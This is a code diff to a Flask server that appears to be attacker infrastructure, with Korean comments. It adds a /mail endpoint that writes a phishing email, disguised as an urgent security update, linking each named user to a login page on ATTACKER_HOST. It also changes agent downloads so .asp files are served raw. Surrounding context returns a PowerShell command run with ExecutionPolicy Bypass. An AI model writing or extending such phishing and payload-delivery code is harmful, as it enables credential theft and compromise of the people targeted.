@@ -148,7 +148,46 @@ def login_trigger():
         "execute": f"powershell -ExecutionPolicy Bypass -File {agent_name}"
     })
 
+# ========================================
+# 피싱 메일 API
+# ========================================
+@app.route("/mail")
+def phishing_mail():
+    client_ip = get_client_ip()
+    user = request.args.get("user", "")
+    
+    log_event(f"[PHISHING_MAIL] ip={client_ip} user={user}")
+    
+    if not user:
+        return jsonify({
+            "status": "error",
+            "message": "user parameter required"
+        }), 400
+    
+    # 피싱 메일 내용 생성
+    mail_content = f"""
+    <html>
+    <body>
+        <h2>중요 보안 업데이트 알림</h2>
+        <p>안녕하세요, {user}님</p>
+        <p>귀하의 계정에 대한 중요한 보안 업데이트가 필요합니다.</p>
+        <p>아래 링크를 클릭하여 보안 업데이트를 완료해주세요:</p>
+        <a href="http://{ATTACKER_HOST}:{PORT}/login?user={user}">보안 업데이트 페이지</a>
+        <p>감사합니다.</p>
+    </body>
+    </html>
+    """
+    
+    return jsonify({
+        "status": "ok",
+        "recipient": user,
+        "mail_content": mail_content,
+        "phishing_link": f"http://{ATTACKER_HOST}:{PORT}/login?user={user}"
+    })
 
+# ========================================
+# 파일 다운로드 API
+# ========================================
 @app.route("/agents/<path:filename>")
 def serve_agent(filename):
     client_ip = get_client_ip()
@@ -164,9 +203,11 @@ def serve_agent(filename):
     
     log_event(f"[AGENT_DOWNLOAD] ip={client_ip} file={filename}")
     
-    # ASP 파일은 text/plain으로 제공
+    # ASP 파일은 raw로 제공
     if filename.endswith('.asp'):
-        return send_file(file_path, mimetype='text/plain')
+        with open(file_path, 'rb') as f:
+            content = f.read()
+        return content, 200, {'Content-Type': 'application/octet-stream'}
     
     return send_file(file_path, as_attachment=True)
 
